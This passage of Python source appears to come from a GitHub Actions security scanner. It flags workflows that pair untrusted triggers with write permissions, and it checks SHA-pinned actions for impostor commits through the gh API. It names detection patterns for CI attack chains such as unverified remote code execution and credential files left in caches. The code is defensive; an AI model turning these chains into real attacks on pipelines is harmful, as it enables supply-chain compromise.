        "issues",
        "pull_request_review",
        "pull_request_review_comment",
        "discussion",
        "discussion_comment",
        "fork",
        "watch",
        "repository_dispatch",
    }
)


_WALK_MAX_DEPTH = 64


def _walk_pull_requests_write(
    node: Any,
    path: tuple[str, ...] = (),
    depth: int = 0,
) -> Iterator[tuple[str, ...]]:
    """Yield the path-tuple of every `pull-requests: write` declaration.

    Bounded by ``_WALK_MAX_DEPTH`` to cap the worst case on pathological
    anchor-heavy YAML (where ``yaml.safe_load`` can produce a deeply
    self-similar object graph). At the cap we log a warning and stop
    descending — surface vs silent stack overflow.
    """
    if depth > _WALK_MAX_DEPTH:
        logger.warning(
            "_walk_pull_requests_write: recursion depth cap (%d) exceeded "
            "at path %r — stopping descent; deeper `pull-requests: write` "
            "declarations (if any) will not be reported",
            _WALK_MAX_DEPTH,
            path,
        )
        return
    if isinstance(node, dict):
        if (
            "pull-requests" in node
            and isinstance(node["pull-requests"], str)
            and node["pull-requests"].lower() == "write"
        ):
            yield path + ("pull-requests",)
        for k, v in node.items():
            yield from _walk_pull_requests_write(
                v, path + (str(k),), depth + 1
            )
    elif isinstance(node, list):
        for i, item in enumerate(node):
            yield from _walk_pull_requests_write(
                item, path + (str(i),), depth + 1
            )


def _find_pull_requests_write_line(lines: list[str]) -> int | None:
    """Best-effort line number for the actual `pull-requests: write` token.

    Scans `lines` for the literal ``pull-requests:`` key. Accepts two
    spellings:

      * Inline value on the same line:  ``pull-requests: write``
      * Block style with value on the next non-empty line:
        ``pull-requests:\\n          write``

    Returns the line of the first match; falls back to ``None`` so the
    caller can substitute the workflow-level ``permissions:`` line. This
    is strictly more accurate than the previous behavior of always
    reporting the workflow-level ``permissions:`` line, which is
    misleading when ``pull-requests: write`` is actually granted at job
    scope.
    """
    key_re = re.compile(r"^\s*pull-requests\s*:\s*(.*?)\s*(?:#.*)?$")
    for i, line in enumerate(lines, start=1):
        m = key_re.match(line)
        if not m:
            continue
        value = m.group(1)
        if value:
            if value.strip().strip('"').strip("'").lower() == "write":
                return i
            continue
        # block style — look ahead for the next non-empty, non-comment line.
        for j in range(i, len(lines)):
            nxt = lines[j].strip()
            if not nxt or nxt.startswith("#"):
                continue
            if nxt.strip().strip('"').strip("'").lower() == "write":
                return i
            break
    return None


def _correlation_pr_write_and_untrusted_trigger(
    file_path: Path,
) -> Iterator[RawHit]:
    """P14.18 — workflow has untrusted-event trigger AND `pull-requests: write`
    at any scope."""
    text = _read_text_safe(file_path)
    if not text:
        return
    doc = _parse_yaml_text(text, file_path)
    if not isinstance(doc, dict):
        return
    on_node = _get_on_node(doc)
    triggers = set(_on_trigger_names(on_node)) if on_node is not None else set()
    untrusted = triggers & _UNTRUSTED_TRIGGERS
    if not untrusted:
        return
    pr_write_paths = list(_walk_pull_requests_write(doc))
    if not pr_write_paths:
        return
    sample_scope = ".".join(pr_write_paths[0])
    line = _find_pull_requests_write_line(text.splitlines()) or _find_line_for_top_level_key(
        text.splitlines(), "permissions"
    ) or 1
    yield RawHit(
        line=line,
        evidence=(
            f"{line:>4}: workflow triggers on {sorted(untrusted)} AND "
            f"grants `pull-requests: write` at scope `{sample_scope}` <-- here"
        ),
        match_text=sample_scope,
        derived=True,
    )


# Correlation function dispatch tables — METADATA's `correlation:` key
# names one of these. The type alias documents (and lets a type checker
# enforce) that each value is a callable from a workflow `Path` to a
# stream of `RawHit`s. `_FILE_CHECKS` shares the same signature but is
# called with the repo root rather than a workflow path; treating both
# as `Callable[[Path], Iterator[RawHit]]` keeps catalog validation
# uniform.
_Correlation = Callable[[Path], Iterator[RawHit]]

_JOB_CORRELATIONS: dict[str, _Correlation] = {
    "credential-file-in-cache-or-artifact": _correlation_credential_file_in_cache_or_artifact,
    "install-scripts-in-privileged-job": _correlation_install_scripts_in_privileged_job,
    "unverified-remote-code-execution": _correlation_unverified_remote_code_execution,
}
_WORKFLOW_CORRELATIONS: dict[str, _Correlation] = {
    "untrusted-trigger-writes-cache": _correlation_untrusted_trigger_writes_cache,
    "pr-write-and-untrusted-trigger": _correlation_pr_write_and_untrusted_trigger,
    "untrusted-checkout-executes": _correlation_untrusted_checkout_executes,
}


# -----------------------------------------------------------------------------
# repo-file-check: reads a file outside .github/workflows/
# -----------------------------------------------------------------------------


_FILE_CHECKS: dict[str, _Correlation] = {
    # Empty since the critical-only descope: the presence-shaped repo-file
    # checks (scanner-installed, tag-pin audit, CODEOWNERS) left the catalog —
    # promoted to scored config facts or dropped. The
    # repo-file-check detector machinery stays for future catalog entries.
}


def _validate_catalog_dispatch(entries: list[CatalogEntry]) -> list[CatalogEntry]:
    """Raise if any correlation/file_check identifier is unknown.

    Catches METADATA typos at catalog load time rather than at scan time.
    Dropping the entry instead would delete a whole chain from the scan
    while the report still claimed full coverage, so an unresolvable
    dispatch id fails the load outright.
    """
    for entry in entries:
        if entry.detector == "yaml-job-correlated":
            if entry.correlation not in _JOB_CORRELATIONS:
                raise ValueError(
                    f"Pattern {entry.pattern}: unknown correlation "
                    f"{entry.correlation!r} for {entry.detector}"
                )
        elif entry.detector == "yaml-workflow-correlated":
            if entry.correlation not in _WORKFLOW_CORRELATIONS:
                raise ValueError(
                    f"Pattern {entry.pattern}: unknown correlation "
                    f"{entry.correlation!r} for {entry.detector}"
                )
        elif entry.detector == "repo-file-check":
            if entry.file_check not in _FILE_CHECKS:
                raise ValueError(
                    f"Pattern {entry.pattern}: unknown file_check "
                    f"{entry.file_check!r} for {entry.detector}"
                )
    return entries


def _prefetch_activity(
    repo: str, workflow_files: list[Path], root: Path, max_workers: int = 12,
) -> dict[str, dict[str, Any]]:
    """Concurrently fetch workflow activity for every workflow file.

    Activity enrichment is one network-latency-bound gh API call per
    workflow. Done serially (the old inline-in-the-detector-loop path) it
    dominated scan time — ~2s × N workflows. The calls are independent and
    read-only, so a bounded thread pool collapses N round-trips into roughly
    one. Returns ``{rel_path: activity_dict}``; a per-workflow failure is
    captured as ``{"status": "unavailable", ...}`` (never raised), so one bad
    call can't abort the whole scan while still reading as "checked and
    failed" rather than "never attempted".
    """
    if not workflow_files:
        return {}

    def _one(wf: Path) -> tuple[str, dict[str, Any]]:
        rel = str(wf.relative_to(root))
        try:
            return rel, fetch_workflow_activity(
                repo, wf.name, workflow_call_only=_is_workflow_call_only(wf),
            )
        # One workflow's failure must not abort the scan — but it must NOT
        # collapse to `{}` either: `{}` means "enrichment never ran" (no
        # --repo), and the report reads that as no data rather than a failed
        # check, so a rate-limited workflow would silently look active.
        except (OSError, ValueError, RuntimeError, subprocess.SubprocessError) as e:
            logger.warning("activity prefetch failed for %s: %s", rel, e)
            return rel, {"status": "unavailable", "reason": str(e)}

    workers = min(max_workers, len(workflow_files))
    with ThreadPoolExecutor(max_workers=workers) as ex:
        return dict(ex.map(_one, workflow_files))


# Anchored at the start of the (comment-stripped) line: a pin is a step's
# `uses:` KEY, optionally introduced by the `- ` list dash. Anchoring — rather
# than searching anywhere in the line — is what keeps commented-out pins
# (`# - uses: old/action@<sha>`) and `uses:` text quoted inside a `run:` block
# scalar (`echo "uses: evil/repo@<sha>"`) out of the pin set. Both would
# otherwise become network-checked, and a 404 on either would render as a
# CRITICAL impostor finding pointing at a line that is not an action reference.
_USES_SHA_LINE_RE = re.compile(
    r"^\s*(?:-\s*)?uses\s*:\s*[\"']?"
    r"([A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+)(?:/[^@\s\"']+)?@([0-9a-fA-F]{40})\b"
)


def _strip_yaml_comment(line: str) -> str:
    """Drop a trailing `#` comment. Safe for this regex's alphabet: neither an
    `owner/repo[/path]` nor a 40-hex sha can contain `#`, so cutting at the
    first `#` never truncates a real pin — it only removes the commentary
    after it (`uses: a/b@<sha>  # v4.1.1` keeps its pin)."""
    idx = line.find("#")
    return line if idx < 0 else line[:idx]


# The same shape, matched against a `uses:` VALUE already extracted from the
# parsed YAML (so quoting, folded scalars and flow style are already resolved).
_PIN_VALUE_RE = re.compile(
    r"^([A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+)(?:/[^@\s]+)?@([0-9a-fA-F]{40})$"
)


def _walk_uses_values(node: Any, depth: int = 0) -> Iterator[str]:
    """Every `uses:` string value in a parsed workflow, in document order.

    Covers step `uses:` and job-level `uses:` (reusable workflows) at any
    nesting depth. Bounded by ``_WALK_MAX_DEPTH`` like the other walkers —
    and, like them, the cap is announced: pins below it are never checked,
    which for a network-gated detector reads as clean.
    """
    if depth > _WALK_MAX_DEPTH:
        logger.warning(
            "_walk_uses_values: recursion depth cap (%d) exceeded — stopping "
            "descent; deeper `uses:` pins (if any) will NOT be collected or "
            "impostor-checked",
            _WALK_MAX_DEPTH,
        )
        return
    if isinstance(node, dict):
        value = node.get("uses")
        if isinstance(value, str):
            yield value.strip()
        for child in node.values():
            yield from _walk_uses_values(child, depth + 1)
    elif isinstance(node, list):
        for item in node:
            yield from _walk_uses_values(item, depth + 1)


def _sha_line_candidates(text: str, sha: str) -> list[int]:
    """Line numbers whose code (comments stripped) contains `sha`, in order.

    A 40-hex sha is effectively unique within a workflow, so this locates a
    pin's line exactly — including when the value sits on a folded-scalar
    continuation line, where the `uses:` key is on a different line.
    """
    lines = text.splitlines()
    hits = [i for i, line in enumerate(lines, start=1)
            if sha in _strip_yaml_comment(line).lower()]
    if hits:
        return hits
    # Only a commented-out occurrence — fall back to it rather than losing
    # the line number entirely.
    return [i for i, line in enumerate(lines, start=1) if sha in line.lower()]


def _collect_sha_pins(
    root: Path, workflow_files: list[Path]
) -> list[tuple[str, int, str, str]]:
    """Every `uses: owner/repo[/path]@<40-hex>` pin: (rel_file, line, repo, sha).

    Pins come from the PARSED workflow, not from a line scan, because the two
    failure directions both matter for a network-gated critical check:

    * a line scan collects things that are not action references — a
      commented-out `# - uses: old/action@<sha>` or a `uses:` string quoted
      inside a `run:` block — and a 404 on either renders as a CRITICAL
      impostor finding on a line that pins nothing;
    * a line scan misses references that are not written on one line —
      a folded scalar (`uses: >-` with the value below) or flow style
      (`- {uses: owner/repo@<sha>}`) — and a missed pin is a silent clean.

    Parsing answers both: the walk sees resolved `uses:` values only. Line
    numbers stay exact by locating the sha itself in the text. Local (`./…`)
    and `docker://` references never match the pin shape. If a workflow does
    not parse, fall back to the anchored line regex rather than dropping its
    pins (an unparseable file is already surfaced as a coverage gap).
    """
    pins: list[tuple[str, int, str, str]] = []
    for wf in workflow_files:
        text = _read_text_safe(wf)
        if not text:
            continue
        rel = str(wf.relative_to(root))
        doc = _parse_yaml_text(text, wf)
        if not isinstance(doc, dict):
            for lineno, line in enumerate(text.splitlines(), start=1):
                m = _USES_SHA_LINE_RE.match(_strip_yaml_comment(line))
                if m:
                    pins.append((rel, lineno, m.group(1), m.group(2).lower()))
            continue
        used_lines: dict[str, int] = {}
        for value in _walk_uses_values(doc):
            m = _PIN_VALUE_RE.match(value)
            if not m:
                continue
            sha = m.group(2).lower()
            candidates = _sha_line_candidates(text, sha)
            idx = used_lines.get(sha, 0)
            # Repeats of one pin consume successive occurrences; past the end,
            # reuse the last known line rather than inventing one.
            lineno = candidates[min(idx, len(candidates) - 1)] if candidates else 1
            used_lines[sha] = idx + 1
            pins.append((rel, lineno, m.group(1), sha))
    return pins


@lru_cache(maxsize=None)
def _gh_repo_visible(repo: str) -> bool:
    """Can this `gh` identity see `repo` at all? The commit endpoint answers
    404 both for 'the canonical repo never contained this commit' (the
    impostor chain) AND for 'you cannot see this repo' — GitHub returns 404,
    not 403, for private resources. Without this probe, a private/internal
    shared-action repo the running token lacks access to would be reported as
    a CRITICAL impostor finding."""
    try:
        result = subprocess.run(
            ["gh", "api", f"repos/{repo}", "--silent"],
            capture_output=True, text=True, timeout=30,
        )
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return False
    return result.returncode == 0


_SHA40_RE = re.compile(r"[0-9a-f]{40}")

# An annotated tag may point at another tag object. Real repos never nest more
# than once or twice; the bound just stops a malicious or broken cycle.
_MAX_TAG_PEEL_DEPTH = 5


def _gh_commit_probe(repo: str, sha: str) -> bool | None:
    """Raw `repos/{repo}/commits/{sha}` verdict: True (present), False (the API
    says absent or unprocessable), None (unknowable — network, rate limit, auth).
    """
    try:
        result = subprocess.run(
            ["gh", "api", f"repos/{repo}/commits/{sha}", "--silent"],
            capture_output=True, text=True, timeout=30,
        )
    except (subprocess.TimeoutExpired, FileNotFoundError):
        return None
    if result.returncode == 0:
        return True
    stderr = result.stderr or ""
    if "HTTP 404" in stderr or "Not Found" in stderr or "HTTP 422" in stderr:
        return False
    logger.debug("impostor check inconclusive for %s@%s: %s", repo, sha, stderr.strip())
    return None


def _gh_peel_tag_object(repo: str, sha: str) -> tuple[str | None, bool]:
    """Peel `sha` as an annotated TAG object in `repo`.

    Returns ``(peeled_commit_sha, answered)``. ``answered=True`` means "the API
    gave us a real answer about this object"; ``answered=False`` means "we do
    not know", which degrades to unverified rather than manufacturing an
    accusation out of a transient error — the exact class of false accusation
    this check exists to avoid.

    Branch by branch:

    - tag peels to a ``commit`` object → ``(commit_sha, True)``.
    - explicit 404/422 from ``git/tags`` → ``(None, True)``. This is the ONLY
      way this function reports an absence: the API said there is no such tag
      object here.
    - any other non-zero exit (rate limit, auth, 5xx) → ``(None, False)``.
    - ``TimeoutExpired`` / ``FileNotFoundError`` (no gh on PATH) →
      ``(None, False)``.
    - malformed / non-JSON body, or an ``object.sha`` that is not 40 hex →
      ``(None, False)``. We asked and got noise; noise is not an absence.
    - tag target is neither ``commit`` nor ``tag`` → ``(None, False)``.
    - cycle detected, or ``_MAX_TAG_PEEL_DEPTH`` exhausted → ``(None, False)``.
      "We gave up walking this chain" is not "the object is absent"; returning
      True there rendered a broken or unusually deep tag chain as an impostor
      accusation.

    `repos/{repo}/commits/{sha}` answers 404/422 for a tag object's own sha, so
    a workflow pinned to the sha of an annotated release tag — which real
    actions publish (astral-sh/setup-uv, pnpm/action-setup) — would otherwise be
    reported as a fork-only or dangling commit. It is a legitimate pin to an
    object the canonical repo really contains.
    """
    seen: set[str] = set()
    current = sha
    for _ in range(_MAX_TAG_PEEL_DEPTH):
        if current in seen:
            logger.debug(
                "tag peel cycled at %s@%s — unresolved, not an absence",
                repo, current,
            )
            return None, False
        seen.add(current)
        try:
            result = subprocess.run(
                ["gh", "api", f"repos/{repo}/git/tags/{current}"],
                capture_output=True, text=True, timeout=30,
            )
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return None, False
        if result.returncode != 0:
            stderr = result.stderr or ""
            definitive = (
                "HTTP 404" in stderr or "Not Found" in stderr
                or "HTTP 422" in stderr
            )
            if not definitive:
                logger.debug(
                    "tag peel inconclusive for %s@%s: %s",
                    repo, current, stderr.strip(),
                )
            return None, definitive
        try:
            obj = (json.loads(result.stdout or "{}") or {}).get("object") or {}
            target_type = obj.get("type")
            target_sha = obj.get("sha")
        except (ValueError, TypeError, AttributeError):
            return None, False
        if not isinstance(target_sha, str) or not _SHA40_RE.fullmatch(target_sha):
            return None, False
        if target_type == "commit":
            return target_sha, True
        if target_type != "tag":
            # A tag pointing at a tree or a blob: we cannot follow it to a
            # commit, but the canonical repo did serve the object. "Cannot
            # resolve" is not "absent".
            logger.debug(
                "tag %s@%s targets a %r — unresolved, not an absence",
                repo, current, target_type,
            )
            return None, False
        current = target_sha
    logger.debug(
        "tag peel exceeded depth %d for %s@%s — unresolved, not an absence",
        _MAX_TAG_PEEL_DEPTH, repo, sha,
    )
    return None, False


def _gh_commit_in_repo(repo: str, sha: str) -> bool | None:
    """Does the canonical `repo` contain the object this workflow pins?
    True/False, or None when the answer is unknowable right now (network error,
    rate limit, a repo this identity cannot see) — an unknown must never be
    reported as either clean or impostor.

    A pin may name a commit OR an annotated tag object. A tag is peeled to the
    commit it points at and that commit is re-probed.

    KNOWN LIMITATION, measured rather than assumed: BOTH endpoints answer about
    the fork NETWORK, not about this repository. `repos/octocat/Hello-World/
    commits/c5a5e51…` returns 200 for a commit that lives only in a fork and is
    reachable from no upstream branch (re-confirmed on `github/gitignore`). So
    a 200 is not proof of canonical containment, and an impostor object planted
    in a fork of the action's own repo reads CLEAN here. What this check
    reliably catches is the pin that resolves to NOTHING in the network at all
    — a deleted, dangling or never-pushed object, the tj-actions shape. Closing
    the fork gap needs a ref-reachability test this API does not offer; see the
    catalog's P14.11 limitation note. The peel still matters: it stops a
    legitimate annotated-release pin from being called an impostor.
    """
    verdict = _gh_commit_probe(repo, sha)
    if verdict is not False:
        return verdict
    # 422 = malformed sha for this repo; 404 = object absent OR repo invisible.
    # Only claim "impostor" once we've confirmed we can actually see the repo —
    # one extra cached call, on the flag path only.
    if not _gh_repo_visible(repo):
        logger.debug(
            "impostor check inconclusive for %s@%s: repo not visible to this "
            "gh identity (private or nonexistent) — not flagged", repo, sha,
        )
        return None
    peeled, answered = _gh_peel_tag_object(repo, sha)
    if peeled is None:
        # No tag object here → the pin really is unreachable. But if the peel
        # never got an answer, we do not know that, and say so.
        return False if answered else None
    logger.debug(
        "%s@%s is an annotated tag object peeling to %s — re-probing that commit",
        repo, sha, peeled,
    )
    # A SERVED tag object is NOT proof of canonical containment: GitHub shares
    # ONE object store across a whole fork network, so `git/tags/{sha}` will
    # happily serve a tag object an attacker created in a fork of this repo.
    # The commit probe is no stronger — see the docstring's measured note; it is
    # simply the narrower of the two questions we can ask, and the only one
    # whose NEGATIVE answer is trustworthy.
    #
    # So the re-probe is the whole verdict, and it has three outcomes, not two:
    #   True  → the peeled commit resolves in the network: nothing to flag on
    #           the evidence available.
    #   False → the tag points at a commit that resolves nowhere — not in this
    #           repo, not anywhere in its fork network: flag it.
    #   None  → we could not tell (network, rate limit): UNVERIFIED. We hold no
    #           independent proof to fall back on, so claiming "verified" here
    #           would assert containment we never established.
    return _gh_commit_probe(repo, peeled)


def _impostor_sha_findings(
    entry: "CatalogEntry", root: Path, workflow_files: list[Path]
) -> tuple[list[tuple[str, RawHit]], str, list[str]]:
    """Run the P14.11 network-gated check.

    Returns ``(hits, status_line, unverified)``: per-file hits as
    ``(rel_file, RawHit)`` tuples, the status recorded in ``gh_checks``,
    and the pins whose verdict was unknowable this run (``repo@sha
    (file:line)``). One cached gh call per unique (repo, sha); every
    occurrence of a flagged pin becomes a hit.

    A run with ANY unknown verdict reports ``partial:``, not ``ran:`` —
    "verified" may only ever be asserted of pins the check actually
    resolved, and the report must be able to name the ones it could not.
    """
    pins = _collect_sha_pins(root, workflow_files)
    if not pins:
        return [], "ran: no sha-pinned actions found", []
    unique = sorted({(repo, sha) for _, _, repo, sha in pins})
    verdicts: dict[tuple[str, str], bool | None] = {}
    for repo, sha in unique:
        verdicts[(repo, sha)] = _gh_commit_in_repo(repo, sha)
    hits: list[tuple[str, RawHit]] = []
    unverified: list[str] = []
    unknowns = sum(1 for v in verdicts.values() if v is None)
    for rel, lineno, repo, sha in pins:
        verdict = verdicts[(repo, sha)]
        if verdict is False:
            hits.append((rel, RawHit(
                line=lineno,
                evidence=(
                    f"{lineno:>4}: uses: {repo}@{sha[:12]}… — commit NOT found in "
                    f"the canonical repo (fork-only or dangling object) <-- here"
                ),
                match_text=f"{repo}@{sha[:12]}",
                derived=True,
            )))
        elif verdict is None:
            unverified.append(f"{repo}@{sha[:12]}… ({rel}:{lineno})")
    verified = len(unique) - unknowns
    if unknowns:
        status = (
            f"partial: {verified} of {len(unique)} unique pin(s) verified, "
            f"{len(hits)} flagged, {unknowns} UNVERIFIED (network/rate-limit) "
            f"— not treated as clean"
        )
    else:
        status = f"ran: {len(unique)} unique pin(s) verified, {len(hits)} flagged"
    return hits, status, unverified


def _dedupe_occurrences(findings: list[Finding]) -> list[Finding]:
    """Collapse findings that name the same (pattern, file, line).

    Two template expressions on one line are one occurrence to fix, and SKILL.md
    calls the JSON the source of truth — so the duplicate cannot live only in
    the JSON with the renderer quietly collapsing it (sentry's
    frontend-snapshots.yml:66 was emitted twice and counted twice). Ids are
    renumbered so they stay contiguous.

    Collapsing is not the same as forgetting. Two DIFFERENT expressions on one
    line are still one occurrence to fix, but a finding that named only the
    first hid the second sink from the reader entirely. So every distinct
    ``match_text`` folded into a kept finding is named on its ``<-- here``
    marker; the transient ``_match_text`` key is stripped on the way out.
    """
    seen: dict[tuple[str, str, int], Finding] = {}
    texts: dict[str, list[str]] = {}
    kept: list[Finding] = []
    for f in findings:
        key = (f["pattern"], f["workflow_file"], f["line"])
        match_text = str(f.pop("_match_text", "") or "")
        if key in seen:
            logger.debug("dropping duplicate occurrence %s at %s:%s", *key)
            bucket = texts[id(seen[key])]
            if match_text and match_text not in bucket:
                bucket.append(match_text)
            # Fold the folded finding's own CLAIM in too, not just its label.
            # Naming the second fetch on the marker stopped it vanishing, but
            # the kept finding's prose still described only the first chain, so
            # what runs out of the second tree was stated nowhere at all.
            note = str(f.get("derived_note") or "")
            kept_note = str(seen[key].get("derived_note") or "")
            if note and note not in kept_note:
                seen[key]["derived_note"] = f"{kept_note} ALSO: {note}"
            continue
        seen[key] = f
        texts[id(f)] = [match_text] if match_text else []
        f["id"] = f"f{len(kept) + 1}"
        kept.append(f)
    for f in kept:
        found = texts.get(id(f)) or []
        if len(found) > 1:
            f["evidence"] = str(f.get("evidence") or "").replace(
                " <-- here", " <-- here: " + ", ".join(found), 1
            )
    return kept


_DEFAULT_GH_SKIP_REASON = "gh not authenticated (run gh auth login)"


def scan(
    catalog: list[CatalogEntry],
    root: Path,
    repo: str | None = None,
    gh_impostor: bool = False,
    gh_skip_reason: str = _DEFAULT_GH_SKIP_REASON,
) -> dict[str, Any]:
    _DROPPED_MATCHES.clear()
    _reset_expression_tokens()
    _PARSE_FAILURES_LOGGED.clear()
    workflow_files = all_workflow_files(root)
    missed = _undiscovered_workflows(root, workflow_files)
    if missed:
        raise CoverageError(
            f"{len(missed)} workflow file(s) exist under {root}/.github/workflows "
            f"but were not discovered ({', '.join(missed[:5])}) — the scan would "
            f"report clean on files it never opened"
        )
    if not workflow_files:
        # Zero workflows is not a clean repo, it is nothing to grade: every
        # chain check would pass vacuously, the config facts would score a
        # workflow-less repo 83.3/100 and the report would render ten green
        # rows. Refuse exactly as a missing `.github/workflows` directory does.
        raise CoverageError(
            f"no workflow files found under {root}/.github/workflows — there is "
            f"nothing to scan, so every check would pass vacuously. This is a "
            f"coverage failure, not a clean repo"
        )
    logger.debug(
        "scan starting: %d catalog entries, %d workflow files under %s",
        len(catalog), len(workflow_files), root,
    )

    # Wall-clock anchor for end-to-end timing: report.py (always the last step)
    # computes total_run_s from this. It lives in scan.py — not just the run.py
    # driver — so the number is captured whether the orchestrator runs run.py or
    # invokes scan.py directly. Without this anchor, a direct-scan run silently
    # drops total_run_s (the failure mode that actually happened).
    _scan_start_epoch = time.time()
    _t_scan_start = time.monotonic()
    findings: list[Finding] = []
    finding_seq = 0
    activity_cache: dict[str, dict[str, Any]] = {}
    # Prefetch activity for every workflow concurrently up front (one gh call
    # each, independent and read-only) so the detector loop below reads a warm
    # cache instead of blocking ~2s per workflow inline.
    _t_enrich_start = time.monotonic()
    if repo:
        activity_cache = _prefetch_activity(repo, workflow_files, root)
    _enrich_s = time.monotonic() - _t_enrich_start

    # gh-impostor-sha runs once per pattern, network-gated. A skip is
    # recorded loudly in gh_checks — never a silent pass.
    gh_checks: dict[str, str] = {}
    # Per-check structured detail the status string can't carry — today the
    # list of pins the impostor check could not resolve, so the report can
    # name each one instead of hiding them behind a count.
    gh_check_details: dict[str, dict[str, Any]] = {}
    for entry in catalog:
        if entry.detector != "gh-impostor-sha":
            continue
        if not gh_impostor:
            gh_checks[entry.pattern] = (
                f"skipped: {gh_skip_reason} (network-gated check did NOT run)"
            )
            continue
        pin_hits, status, unverified = _impostor_sha_findings(
            entry, root, workflow_files
        )
        gh_checks[entry.pattern] = status
        if unverified:
            gh_check_details[entry.pattern] = {"unverified": unverified}
        for rel, hit in pin_hits:
            finding_seq += 1
            findings.append({
                "id": f"f{finding_seq}",
                "pattern": entry.pattern,
                "severity": entry.severity,
                "title": entry.title_template.format(
                    basename=rel.rsplit("/", 1)[-1], pattern=entry.pattern,
                    severity=entry.severity, match_text=hit.match_text,
                ),
                "workflow_file": rel,
                "line": hit.line,
                "affected_jobs": [],
                "workflow_activity": activity_cache.get(rel, {}),
                "evidence": hit.evidence,
                "evidence_kind": "derived" if hit.derived else "source",
                "fix_strategy": entry.fix_strategy,
                "fix_recipe_anchor": entry.anchor,
            })

    # repo-file-check runs once per pattern (not per workflow file).
    # Pop these out of the per-workflow loop below.
    for entry in catalog:
        if entry.detector != "repo-file-check":
            continue
        assert entry.file_check, "validated in __post_init__"
        check_fn = _FILE_CHECKS.get(entry.file_check)
        if check_fn is None:
            logger.warning(
                "Pattern %s: unknown file_check %r — skipping",
                entry.pattern, entry.file_check,
            )
            continue
        hits = list(check_fn(root))
        for hit in hits:
            finding_seq += 1
            findings.append({
                "id": f"f{finding_seq}",
                "pattern": entry.pattern,
                "severity": entry.severity,
                "title": entry.title_template.format(
                    basename="(repo)", pattern=entry.pattern,
                    severity=entry.severity, match_text=hit.match_text,
                ),
                "workflow_file": "(repo-wide)",
                "line": hit.line,
                "affected_jobs": [],
                "workflow_activity": {},
                "evidence": hit.evidence,
                "evidence_kind": "derived" if hit.derived else "source",
                "fix_strategy": entry.fix_strategy,
                "fix_recipe_anchor": entry.anchor,
            })

    for entry in catalog:
        if entry.detector in ("repo-file-check", "gh-impostor-sha"):
            continue  # already handled above
        if entry.detector == "manual":
            # Documentation-only pattern: not scanned; the catalog
            # section is reference material for human review.
            continue
        if not entry.affected_globs:
            continue

        candidates = [
            f for f in workflow_files
            if _path_matches_any_glob(
                str(f.relative_to(root)),
                entry.affected_globs,
            )
        ]
        logger.debug(
            "evaluating %s (%s) against %d candidate file(s)",
            entry.pattern, entry.detector, len(candidates),
        )

        for wf in candidates:
            rel = str(wf.relative_to(root))
            basename = wf.name

            if entry.detector == "regex":
                assert entry.match is not None  # validated in __post_init__
                hits = list(detect_regex(wf, entry.match))
            elif entry.detector == "yaml-path":
                assert entry.yaml_path is not None
                hits = list(
                    detect_yaml_path(wf, entry.yaml_path, entry.yaml_value)
                )
            elif entry.detector == "yaml-path-absent":
                assert entry.yaml_path is not None
                hits = list(detect_yaml_path_absent(wf, entry.yaml_path))
            elif entry.detector == "yaml-on-trigger":
                assert entry.trigger_keys is not None
                hits = list(detect_yaml_on_trigger(wf, entry.trigger_keys))
            elif entry.detector == "yaml-run-injection":
                assert entry.match is not None
                hits = list(detect_yaml_run_injection(wf, entry.match))
            elif entry.detector == "yaml-job-correlated":
                assert entry.correlation, "validated in __post_init__"
                corr_fn = _JOB_CORRELATIONS.get(entry.correlation)
                if corr_fn is None:
                    logger.warning(
                        "Pattern %s: unknown correlation %r — skipping",
                        entry.pattern, entry.correlation,
                    )
                    continue
                hits = list(corr_fn(wf))
            elif entry.detector == "yaml-workflow-correlated":
                assert entry.correlation, "validated in __post_init__"
                wcorr_fn = _WORKFLOW_CORRELATIONS.get(entry.correlation)
                if wcorr_fn is None:
                    logger.warning(
                        "Pattern %s: unknown correlation %r — skipping",
                        entry.pattern, entry.correlation,
                    )
                    continue
                hits = list(wcorr_fn(wf))
            else:
                continue

            logger.debug(
                "  %s: %d hit(s) on %s", entry.pattern, len(hits), rel,
            )
            if not hits:
                continue

            jobs = affected_jobs_for(wf)
            job_ranges = job_line_ranges(wf)
            if repo:
                if rel not in activity_cache:
                    activity_cache[rel] = fetch_workflow_activity(
                        repo, basename,
                        workflow_call_only=_is_workflow_call_only(wf),
                    )
                activity = activity_cache[rel]
            else:
                activity = {}

            for hit in hits:
                finding_seq += 1
                # A line-anchored hit affects the ONE job that contains it.
                # Stamping the file's whole job list on every occurrence read
                # as "all 22 of these jobs are affected" and contradicted the
                # finding's own evidence. A hit that sits outside every job
                # (workflow-scope permissions, triggers) really does affect
                # them all, and keeps the full list.
                #
                # `job_ranges is None` is a THIRD case: attribution could not
                # be computed at all. That also keeps the full list, but it is
                # not the same claim as "workflow-scope", so the finding
                # carries a note saying which one the reader is looking at.
                if job_ranges is None:
                    hit_jobs = jobs
                    jobs_note: str | None = (
                        "job attribution unavailable — this workflow's YAML "
                        "line marks could not be composed, so every job is "
                        "listed; this is not a claim that the finding is "
                        "workflow-scope"
                    )
                else:
                    containing_job = job_at_line(job_ranges, hit.line)
                    hit_jobs = [containing_job] if containing_job else jobs
                    jobs_note = None
                fmt_vars = {
                    "basename": basename,
                    "pattern": entry.pattern,
                    "severity": entry.severity,
                    "match_text": hit.match_text,
                }
                try:
                    title = entry.title_template.format(**fmt_vars)
                except (KeyError, IndexError) as e:
                    logger.warning(
                        "Pattern %s has bad title_template %r: %s",
                        entry.pattern,
                        entry.title_template,
                        e,
                    )
                    title = f"{entry.pattern} hit in {basename}"

                findings.append({
                    "id": f"f{finding_seq}",
                    "pattern": entry.pattern,
                    "severity": entry.severity,
                    "title": title,
                    "workflow_file": rel,
                    "line": hit.line,
                    "affected_jobs": hit_jobs,
                    # Present only when the job list is a fallback rather than
                    # an attribution; report.py renders it beside the jobs.
                    **({"affected_jobs_note": jobs_note} if jobs_note else {}),
                    "workflow_activity": activity,
                    "evidence": hit.evidence,
                    # Optional second claim, always rendered as derived: the
                    # condition elsewhere in the job that makes the quoted
                    # line a finding (see RawHit.derived_note). Absent for
                    # every detector that has only one claim to make.
                    **({"derived_note": hit.derived_note}
                       if hit.derived_note else {}),
                    # Says whether `evidence` quotes the file or states a
                    # claim this scanner derived from it; the report renders
                    # the two differently so a derived sentence is never
                    # dressed as source the reader can go and find.
                    "evidence_kind": "derived" if hit.derived else "source",
                    "fix_strategy": entry.fix_strategy,
                    "fix_recipe_anchor": entry.anchor,
                    # `risk` and `risk_note` are deliberately absent.
                    # The orchestrator scores them per group against
